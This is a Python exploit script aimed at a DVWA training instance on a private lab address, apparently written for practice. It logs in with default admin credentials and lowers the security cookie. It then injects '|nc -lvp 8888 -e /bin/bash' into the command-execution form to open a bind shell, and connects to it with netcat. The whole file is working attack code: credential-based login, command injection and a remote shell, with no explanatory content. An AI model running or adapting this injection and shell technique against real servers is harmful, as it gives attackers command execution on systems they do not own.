import requests
import re
import time
import os
import threading
from pprint import pprint

def login(session):
    
    proxy='127.0.0.1:8080'
    proxies={
        'http':'http://'+proxy,
        'https':'https://'+proxy
        }
    
    url="http://192.168.26.26/DVWA/login.php"
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42'
    }
    res = session.get(url=url,headers=headers).text
    re_token=re.compile(r"value='(.*)' />\r\n")
    token=re.findall(re_token,res)[0]
    #print(token)
    data={'username':'admin',
        'password':'password',
        'Login':'password',
        'user_token':{token}
    }
    response_headers = session.post(url=url,headers=headers,data=data,allow_redirects = False)
    index= session.post(url="http://192.168.26.26/DVWA/index.php")

    cookies=session.cookies
    print(type(cookies))
    b=requests.utils.dict_from_cookiejar(cookies)
    b['security']='low'
    b=requests.utils.cookiejar_from_dict(b,cookiejar=None,overwrite=True)
    session.cookies=b
    a=[(';'.join(['='.join(item)for item in cookies.items()]))]
    print(a)

def qwe(session):
    ip={'ip':'|nc -lvp 8888 -e /bin/bash',
        'Submit':'Submit'
    }
    response_headers = session.post(url="http://192.168.26.26/DVWA/vulnerabilities/exec/",data=ip,allow_redirects = False)
    #pprint(response_headers.text)
    os.system('nc 192.168.26.26 8888')

def main():
    session = requests.session()
    login(session)
    t=threading.Thread(target=login,args=(session,))
    t.start()
    time.sleep(0.5)
    qwe(session)
main()
